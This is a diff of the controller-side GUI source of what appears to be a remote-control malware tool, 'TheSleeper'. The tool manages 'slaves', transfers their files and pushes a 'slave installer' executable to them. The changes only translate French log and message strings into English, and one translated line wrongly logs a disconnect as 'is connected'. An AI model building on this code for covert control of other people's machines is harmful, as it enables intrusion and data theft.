@@ -128,7 +128,7 @@ namespace TheSleeper
 
     void ServerWindow::updateConnected(const QString& ip, const QString& port)
     {
-        LOG << "Activation de l'interface graphique...";
+        LOG << "GUI enabled";
         tabWidget->setEnabled(true);
         
         portLabel->setVisible(false);
@@ -147,7 +147,7 @@ namespace TheSleeper
 
     void ServerWindow::updateDisconnected()
     {
-        LOG << "Desactivation de l'interface graphique...";
+        LOG << "GUI disabled";
         tabWidget->setEnabled(false);
         portBox->setVisible(true);
         mdpLabel->setVisible(true);
@@ -170,12 +170,12 @@ namespace TheSleeper
 		if(listener->isListening())
         {
 			listener->stopListen();
-            listenButton->setText(tr("Attendre connexions"));
+            listenButton->setText(tr("Start listening"));
         }
         else
 		{
             listener->listen();
-            listenButton->setText(tr("Stopper les connexions"));
+            listenButton->setText(tr("Stop listening"));
         }
     }
 
@@ -214,7 +214,7 @@ namespace TheSleeper
                 
                 if(currentClient == clients.end())
                 {
-                    LOG << "Plus de client.";
+                    LOG << "No slave left";
                     updateDisconnected();
                 }
             }
@@ -225,7 +225,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue";
+            LOG << "Unkown exception";
         }
     }
 
@@ -235,7 +235,7 @@ namespace TheSleeper
         // pour le savoir on n'utilise : QObject::sender()
         ClientPtr disconnectedClient = (ClientPtr) QObject::sender();
         
-        LOG << "Le client " + disconnectedClient->getIp().toStdString()+":"+disconnectedClient->getPort().toStdString()+" s'est deconnecte.";
+        LOG << "Slave " + disconnectedClient->getIp().toStdString() + ":" + disconnectedClient->getPort().toStdString() + " is connected";
         
 		// on le deconnecte proprement
         disconnectedClient->disconnect();
@@ -267,7 +267,7 @@ namespace TheSleeper
         {
             if((*iter)->getUniqueId() == id_stream)
             {
-                LOG << "Association connexion auxiliaire avec client.";
+                LOG << "New association of secondary connection for slave";
                 stream_mutex.lock();
                 (*iter)->addStream(new_stream);
                 stream_associated.wakeAll();
@@ -281,7 +281,7 @@ namespace TheSleeper
     {
         try
         {
-			LOG << "Creation nouveau client.";
+			LOG << "Creating new slave object";
             // construit un nouvel objet Client que l'on associe au nouveau flux
             Client * client = new Client(session);
 
@@ -314,7 +314,7 @@ namespace TheSleeper
         }
         catch(...)
         {
-            LOG << "Erreur d'origine inconnue";
+            LOG << "Unknown exception";
         }
     }
 
@@ -322,7 +322,7 @@ namespace TheSleeper
     {        
         if(current_index == index)
         {
-            LOG << "Je controle deja le client selectionne.";
+            LOG << "Same slave to control";
         }
         else
         {
@@ -339,7 +339,7 @@ namespace TheSleeper
 
     void ServerWindow::switchClient()
     {
-        LOG << "Switch du client.";        
+        LOG << "Switching slave";        
         if(currentClient != clients.end())
         {
             screenProgressBar->setValue(0);
@@ -353,15 +353,15 @@ namespace TheSleeper
         }
         else
         {
-            LOG << "Plus de client connecte.";
+            LOG << "No slave left";
             updateDisconnected();
         }
     }
 
     void ServerWindow::onFailedAuth()
     {
-        LOG << "Echec de l'authentification.";
-        connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Bad Password </font> "));
+        LOG << "Authentication failed";
+        connectionStatusLabel->setText(tr(" <font color=\"#FF0000\">Bad password</font> "));
     }
 
     void ServerWindow::configureOptions()
@@ -398,7 +398,7 @@ namespace TheSleeper
         if(currentClient != clients.end())
         {
             // on informe l'utilisateur que c'est une manoeuvre risquée
-            QMessageBox::information(this, windowTitle(),tr("Attention, le fichier que vous devez choisir doit etre un client de type Inhibitor valide."));
+            QMessageBox::information(this, windowTitle(),tr("Warning, you must select a valid Innocence slave installer"));
 
             // on trouve le chemin du nouvel injecteur
             QString fileName = QFileDialog::getOpenFileName(this, tr("Open File"),"C:\\",tr("Executable (*.exe)"));
@@ -545,7 +545,7 @@ namespace TheSleeper
         {
             if(!(*currentClient)->browseFiles(index))
             {
-                QMessageBox::information(0, "Theclient","Impossible de lister ce repertoire.");
+                QMessageBox::information(0, "Theclient","Can't list directory");
             }
         }
     }
@@ -557,26 +557,26 @@ namespace TheSleeper
             // si un fichier a été sélectionné sur le serveur
             if(remoteFilesView->currentIndex() == QModelIndex())
             {
-                QMessageBox::information(0, "TheSleeper",tr("Veuillez selectionner un fichier a telecharger depuis le client."));
+                QMessageBox::information(0, "TheSleeper",tr("Please select a file to download from slave"));
                 return;
             }
 
             QString sourceFileName = (*currentClient)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
             if(sourceFileName[sourceFileName.size()-1] == '\\')
             {
-                QMessageBox::information(0, "Theclient",tr("Veuillez selectionner un fichier a telecharger, et non un dossier."));
+                QMessageBox::information(0, "TheSleeper",tr("Please select a source file instead of source directory"));
                 return;
             }
             
 			if(localFilesView->currentIndex() == QModelIndex ())
             {
-                QMessageBox::information(0, "TheSleeper",tr("Veuillez selectionner un dossier de destination."));
+                QMessageBox::information(0, "TheSleeper",tr("Please select a destination folder"));
                 return;
             }
             
             if(!localFilesModel.isDir(localFilesView->currentIndex()))
             {
-                QMessageBox::information(0, "TheSleeper",tr("Veuillez selectionner un dossier de destination et non un fichier."));
+                QMessageBox::information(0, "TheSleeper",tr("Please select a destination directory instead of destination file"));
                 return;
             }
             
@@ -592,14 +592,14 @@ namespace TheSleeper
         {
             if(localFilesModel.isDir(localFilesView->currentIndex()))
             {
-                QMessageBox::information(0, "TheSleeper",tr("Veuillez sélectionner le fichier a uploader."));
+                QMessageBox::information(0, "TheSleeper",tr("Please select the file to upload"));
                 return;
             }
             
             QString destinationFileName = (*currentClient)->getRemoteFileTree().data(remoteFilesView->currentIndex()).toString();
             if(destinationFileName[destinationFileName.size()-1] != '\\')
             {
-                QMessageBox::information(0, "TheSleeper",tr("Veuillez sélectionner un dossier de destination sur le serveur."));
+                QMessageBox::information(0, "TheSleeper",tr("Please select a destination directory"));
                 return;
             }
             
@@ -609,4 +609,4 @@ namespace TheSleeper
         }
     }
     
-} /* Theclient */
+} /* TheSleeper */
